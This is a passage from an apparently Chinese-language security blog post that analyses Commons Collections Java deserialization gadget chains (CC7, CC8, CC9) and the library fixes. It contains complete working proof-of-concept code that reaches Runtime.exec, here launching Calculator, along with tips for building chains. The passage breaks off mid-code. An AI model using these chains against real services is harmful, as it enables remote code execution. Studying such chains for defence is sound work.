<p>&#x901A;&#x8FC7; <code>Hashtable#readObject</code> &#xFF0C;&#x6211;&#x4EEC;&#x77E5;&#x9053; key &#x8DDF; value &#x7684;&#x503C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E4B;&#x524D; put &#x8FDB;&#x53BB;&#x7684;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">hashtable.put(key, value);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212175740438.png" alt="image-20210212175740438"></p>
<p>&#x7B2C;&#x4E00;&#x6B21;&#x8C03;&#x7528; <code>Hashtable#reconstitutionPut</code> &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165;&#x5FAA;&#x73AF;&#xFF0C;&#x4F1A;&#x7ED9; <code>tab[index]</code> &#x521D;&#x59CB;&#x5316;&#x9644;&#x503C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212181530639.png" alt></p>
<p>&#x7B2C;&#x4E8C;&#x6B21;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8C03;&#x7528;&#x5176; key &#x7684; <code>equals</code>&#xFF0C;&#x8FDB;&#x5165;&#x5176;  <code>equals</code> &#x65B9;&#x6CD5;&#x540E; <code>e.hash == hash</code> &#x9700;&#x8981;&#x524D;&#x540E; hash &#x503C;&#x76F8;&#x7B49;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183042252.png" alt></p>
<p> <code>AbstractMapDecorator#equals</code>&#x8C03;&#x7528; map &#x7684;  <code>equals</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183017632.png" alt="image-20210212183017632"></p>
<p><code>AbstractMap#equals</code> &#x8C03;&#x7528; m &#x7684; <code>get</code>&#xFF0C; &#x4E5F;&#x5C31;&#x662F; <code>LazyMap#get</code>&#xFF0C;&#x7531;&#x6B64;&#x89E6;&#x53D1; RCE</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212183002189.png" alt></p>
<p>&#x6784;&#x9020; payload &#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x6700;&#x540E;&#x9700;&#x8981;&#x628A; lazyMap2 &#x7684; yy &#x952E; remove &#x6389;</p>
<p>&#x56E0;&#x4E3A; <code>hashtable.put(lazyMap2, 2);</code> &#x8FD9;&#x91CC;&#x5728;&#x8C03;&#x7528; put &#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x4F1A;&#x8C03;&#x7528;&#x5230; equals &#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x4F1A;&#x589E;&#x52A0;&#x4E00;&#x4E2A;yy&#x952E;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5176;&#x6B63;&#x5E38;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x5C31;&#x8981;&#x79FB;&#x9664;&#x6389;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212201448996.png" alt></p>
<p><strong>CC7 payload</strong> </p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)}),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        <span class="hljs-comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="Commons-Collections-Version"><a href="#Commons-Collections-Version" class="headerlink" title="Commons Collections Version"></a>Commons Collections Version</h1><h2 id="Commons-Collections-3-2-2-Fix"><a href="#Commons-Collections-3-2-2-Fix" class="headerlink" title="Commons Collections 3.2.2 Fix"></a>Commons Collections 3.2.2 Fix</h2><p>3.2.2 &#x7248;&#x672C;&#x4F7F;&#x7528;&#x4E86;&#x9ED1;&#x540D;&#x5355;&#xFF0C;&#x7981;&#x6B62;&#x4E86; InvokerTransformer &#x7C7B;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x4F7F;&#x7528;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream os)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">    FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">    os.defaultWriteObject();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream is)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException </span>{</span><br><span class="line">    FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">    is.defaultReadObject();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Commons-Collections-4-1-Fix"><a href="#Commons-Collections-4-1-Fix" class="headerlink" title="Commons Collections 4.1 Fix"></a>Commons Collections 4.1 Fix</h2><p>4.1 InvokerTransformer &#x548C; InstantiateTransformer &#x4E24;&#x4E2A;&#x7C7B;&#x90FD;&#x6CA1;&#x6709;&#x5B9E;&#x73B0; Serializable &#x63A5;&#x53E3;</p>
<p><code>org.apache.commons.collections4.functors.InvokerTransformer</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212211823221.png" alt></p>
<p><code>org.apache.commons.collections4.functors.InstantiateTransformer</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212211841160.png" alt></p>
<h1 id="More-Gadget-Chain"><a href="#More-Gadget-Chain" class="headerlink" title="More Gadget Chain"></a>More Gadget Chain</h1><h2 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h2><p>&#x5206;&#x6790;&#x89C1;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;<a href="https://www.anquanke.com/post/id/190472#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190472#h3-4</a></p>
<blockquote>
<p>CommonsCollections8&#x662F;&#x4ECA;&#x5E74;<strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>&#x63A8;&#x9001;&#x5230;ysoserial&#x4E0A;&#x7684;&#xFF0C;8&#x4E0E;2&#xFF0C;4&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4F7F;&#x7528;&#x4E86;&#x65B0;&#x7684;readObject&#x89E6;&#x53D1;&#x70B9;<code>TreeBag</code></p>
</blockquote>
<p><code>TreeBag#readObject</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152550114.png" alt></p>
<p>&#x8C03;&#x7528;&#x7236;&#x7C7B;&#x7684; <code>doReadObject</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152630578.png" alt></p>
<p>&#x8C03;&#x7528;&#x5176; <code>map</code> &#x7684; <code>put</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152729420.png" alt></p>
<p>&#x540E;&#x7EED;&#x5C31;&#x662F; CC2 &#x4E2D;&#x5229;&#x7528; compare &#x7684;&#x601D;&#x8DEF;&#x4E86;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213152823836.png" alt></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">TreeBag.readObject()</span><br><span class="line">    -&gt; AbstractMapBag.doReadObject()</span><br><span class="line">    -&gt; TreeMap.put()</span><br><span class="line">    -&gt; TransformingComparator.compare()</span><br><span class="line">    -&gt; InvokerTransformer.transform()</span><br><span class="line">    -&gt; TemplatesImpl.newTransformer()</span><br><span class="line">    ... templates Gadgets ...</span><br><span class="line">    -&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h2><p>&#x7ED3;&#x5408; <a href="https://github.com/frohoff/ysoserial/pulls" target="_blank" rel="noopener">ysoserial Pull requests</a> &#x770B;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x7684; gadget</p>
<p>@&#x6885;&#x5B50;&#x9152;&#x5E08;&#x5085;&#x7684; <a href="https://github.com/frohoff/ysoserial/pull/125" target="_blank" rel="noopener">CommonsCollections9</a></p>
<p>&#x4E3B;&#x8981;&#x5229;&#x7528;&#x7684;&#x662F;CommonsCollections:3.2&#x7248;&#x672C;&#x65B0;&#x589E;&#x7684; DefaultedMap &#x6765;&#x4EE3;&#x66FF; LazyMap</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212210310039.png" alt></p>
<p>RCE demo</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        DefaultedMap mapDemo = (DefaultedMap) DefaultedMap.decorate(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7ED3;&#x5408;&#x4E00;&#x4E9B; CC5 &#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;&#x6765;&#x5B8C;&#x6574;&#x7684; gadget</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC9</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        DefaultedMap mapDemo = (DefaultedMap) DefaultedMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        Field valDemo = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);</span><br><span class="line">        valDemo.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        valDemo.set(finaldemo, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212213711575.png" alt></p>
<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><p>&#x590D;&#x73B0;&#x5206;&#x6790;&#x5B8C; CC &#x540E;&#x7684;&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;</p>
<p><strong>&#x6316;&#x6398;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;</strong></p>
<p>&#x6316;&#x6398;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x627E;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x91CC;&#x9762;&#x53CD;&#x5C04;&#x8C03;&#x7528; <code>java.lang.Runtime</code>&#xFF0C;&#x89E6;&#x53D1; RCE &#x7684;&#x70B9;&#x53EB; m0 &#x7136;&#x540E;&#x6784;&#x9020;&#x4E00;&#x6BB5;&#x547D;&#x4EE4;&#x6267;&#x884C; Level-0 &#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x968F;&#x540E;&#x6211;&#x4EEC;&#x7EE7;&#x7EED;&#x627E;&#x5BF9;&#x8C61;&#xFF0C;&#x5BFB;&#x627E;&#x5BF9;&#x8C61;&#x91CC;&#x9762;&#x67D0;&#x4E2A;&#x65B9;&#x6CD5;&#x51FA;&#x53D1; m0 &#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x53EB;m1&#xFF0C;&#x968F;&#x540E;&#x5F53;&#x524D;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x6709;&#x6CA1;&#x6709;&#x8C03;&#x7528; m1 &#x7684;&#xFF0C;&#x53EF;&#x80FD;&#x6709; m2, m3, m4 &#x7B49;&#x7B49;&#xFF0C;&#x4E4B;&#x540E;&#x518D;&#x627E;&#x4E00;&#x4E2A;&#x7C7B;&#x89E6;&#x53D1; m1, m2, m3, m4 &#x7684;&#x65B9;&#x6CD5;&#x2026;&#x7136;&#x540E;&#x4E0D;&#x65AD;&#x5FAA;&#x73AF;&#xFF0C;&#x76F4;&#x5230;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x7C7B;&#x80FD;&#x6EE1;&#x8DB3;&#xFF1A;</p>
<ol>
<li>&#x8BE5;&#x7C7B;&#x80FD;&#x8C03;&#x7528; xx &#x5BF9;&#x8C61;&#x7684; xx &#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x5FAA;&#x73AF;&#x8C03;&#x7528;&#x5230;&#x6700;&#x540E; RCE &#x7684; Level -0 &#x7684;&#x65B9;&#x6CD5;</li>
<li>&#x8BE5;&#x7C7B;&#x53EF;&#x4EE5;&#x88AB;&#x5E8F;&#x5217;&#x5316;</li>
</ol>
<p><strong>&#x5982;&#x4F55;&#x4F18;&#x96C5;&#x7684;&#x5F39; Calc</strong></p>
<p>&#x95EE;&#x9898;&#x6765;&#x6E90;&#x4E8E;&#x7ECF;&#x5E38;&#x6784;&#x9020;&#x597D;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x70B9;&#x4E4B;&#x540E;&#xFF0C;&#x5728; IDEA &#x4E0B;&#x7ECF;&#x5E38;&#x7F16;&#x8BD1;&#x5668;&#x4F1A;&#x5E2E;&#x6211;&#x4EEC;&#x89E6;&#x53D1;&#x4E00;&#x4E9B; toString &#x7B49;&#x64CD;&#x4F5C;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x8FD8;&#x6CA1;&#x6709;&#x89E6;&#x53D1;&#x5230; readObject&#xFF0C;&#x5C31;&#x7ECF;&#x5E38;&#x5F39; Calc &#x4E86;</p>
<p>@phithon &#x5E08;&#x5085;Java&#x5B89;&#x5168;&#x6F2B;&#x8C08;&#x91CC;&#x7ED9;&#x51FA;&#x7684;&#x7B54;&#x6848;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};</span><br><span class="line">    Transformer[] transformers = &#x4F60;&#x6784;&#x9020;&#x7684; transformers</span><br><span class="line">    Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">    f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// ==================</span></span><br><span class="line">    <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">    ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(expMap);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// &#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x89E6;&#x53D1;</span></span><br><span class="line">    System.out.println(barr);</span><br><span class="line">    ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><strong>&#x5173;&#x4E8E; ChainedTransformer &#x6267;&#x884C;&#x591A;&#x6761;&#x547D;&#x4EE4;</strong></p>
<p>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<a href="https://t.zsxq.com/aufUJEa" target="_blank" rel="noopener">https://t.zsxq.com/aufUJEa</a></p>
<p>RCE demo</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span 